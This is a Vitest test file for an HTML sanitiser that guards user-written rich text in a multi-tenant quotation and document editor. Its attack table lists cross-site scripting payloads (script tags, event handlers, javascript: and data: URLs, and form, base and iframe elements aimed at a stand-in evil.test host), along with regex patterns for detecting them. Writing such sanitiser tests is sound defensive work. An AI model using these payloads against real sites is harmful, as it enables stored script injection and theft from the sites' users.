import { describe, it, expect } from 'vitest';
import { sanitizeRichText } from './sanitize-html';

/**
 * The quotation body and document editor content are written by one user and
 * rendered for others, so anything executable that survives sanitisation is
 * stored cross-site scripting on the tenant origin.
 */
describe('sanitizeRichText', () => {
  describe('removes executable content', () => {
    const attacks: [string, string][] = [
      ['script element', '<script>alert(1)</script>'],
      ['image error handler', '<img src=x onerror="alert(1)">'],
      ['body onload', '<body onload="alert(1)">text</body>'],
      ['svg onload', '<svg onload="alert(1)"></svg>'],
      ['iframe', '<iframe src="https://evil.test"></iframe>'],
      ['javascript URL', '<a href="javascript:alert(1)">click</a>'],
      ['data URL script', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
      ['object element', '<object data="evil.swf"></object>'],
      ['embed element', '<embed src="evil.swf">'],
      ['form exfiltration', '<form action="https://evil.test"><input name="a"></form>'],
      ['base tag hijack', '<base href="https://evil.test/">'],
      ['style element', '<style>body{display:none}</style>'],
      ['onfocus autofocus', '<input autofocus onfocus="alert(1)">'],
      ['nested script in markup', '<div><p>hi</p><script>alert(1)</script></div>'],
      ['uppercase handler', '<IMG SRC=x ONERROR=alert(1)>'],
      ['malformed handler', '<img src="x" onerror=alert(1) //>'],
      ['link stylesheet', '<link rel="stylesheet" href="https://evil.test/x.css">'],
    ];

    it.each(attacks)('strips %s', (_label, payload) => {
      const cleaned = sanitizeRichText(payload);

      expect(cleaned).not.toMatch(/<script/i);
      expect(cleaned).not.toMatch(/\son\w+\s*=/i);
      expect(cleaned).not.toMatch(/javascript:/i);
      expect(cleaned).not.toMatch(/<iframe/i);
      expect(cleaned).not.toMatch(/<object/i);
      expect(cleaned).not.toMatch(/<embed/i);
      expect(cleaned).not.toMatch(/<form/i);
      expect(cleaned).not.toMatch(/<base/i);
      expect(cleaned).not.toMatch(/<style/i);
      expect(cleaned).not.toMatch(/<link/i);
    });
  });

  describe('keeps legitimate document formatting', () => {
    it('preserves headings, emphasis and lists', () => {
      const input =
        '<h2>Scope</h2><p><strong>Phase 1</strong> and <em>Phase 2</em></p><ul><li>Item</li></ul>';
      expect(sanitizeRichText(input)).toBe(input);
    });

    it('preserves tables', () => {
      const input =
        '<table><thead><tr><th>Service</th></tr></thead><tbody><tr><td colspan="2">Payroll</td></tr></tbody></table>';
      expect(sanitizeRichText(input)).toContain('<table>');
      expect(sanitizeRichText(input)).toContain('colspan="2"');
    });

    it('keeps https links and images', () => {
      const cleaned = sanitizeRichText(
        '<a href="https://voogyo.com">site</a><img src="https://voogyo.com/logo.png" alt="Logo">',
      );
      expect(cleaned).toContain('href="https://voogyo.com"');
      expect(cleaned).toContain('src="https://voogyo.com/logo.png"');
      expect(cleaned).toContain('alt="Logo"');
    });

    it('keeps mailto and relative links', () => {
      expect(sanitizeRichText('<a href="mailto:a@b.com">mail</a>')).toContain('mailto:a@b.com');
      expect(sanitizeRichText('<a href="/quotes/1">quote</a>')).toContain('href="/quotes/1"');
    });
  });

  describe('style attribute policy', () => {
    it('keeps ordinary typography declarations', () => {
      const cleaned = sanitizeRichText('<p style="color: #333; text-align: center;">x</p>');
      expect(cleaned).toContain('color: #333');
      expect(cleaned).toContain('text-align: center');
    });

    it('drops positioning used for overlay attacks', () => {
      const cleaned = sanitizeRichText(
        '<div style="position: fixed; top: 0; z-index: 9999; color: red;">x</div>',
      );
      expect(cleaned).not.toMatch(/position/i);
      expect(cleaned).not.toMatch(/z-index/i);
      expect(cleaned).toContain('color: red');
    });

    it('drops url() references', () => {
      const cleaned = sanitizeRichText(
        '<p style="background-color: url(https://evil.test/track.png);">x</p>',
      );
      expect(cleaned).not.toMatch(/url\s*\(/i);
    });
  });

  describe('behaviour', () => {
    it('adds noopener to links that open a new tab', () => {
      const cleaned = sanitizeRichText('<a href="https://x.test" target="_blank">x</a>');
      expect(cleaned).toContain('rel="noopener noreferrer"');
    });

    it('keeps the readable text when markup is stripped', () => {
      expect(sanitizeRichText('<script>alert(1)</script>Real content')).toContain('Real content');
    });

    it('is idempotent, so sanitising twice changes nothing', () => {
      const once = sanitizeRichText('<p style="color: red;">Hi <b>there</b></p>');
      expect(sanitizeRichText(once)).toBe(once);
    });

    it('handles empty input', () => {
      expect(sanitizeRichText('')).toBe('');
      expect(sanitizeRichText(null)).toBe('');
      expect(sanitizeRichText(undefined)).toBe('');
    });
  });
});
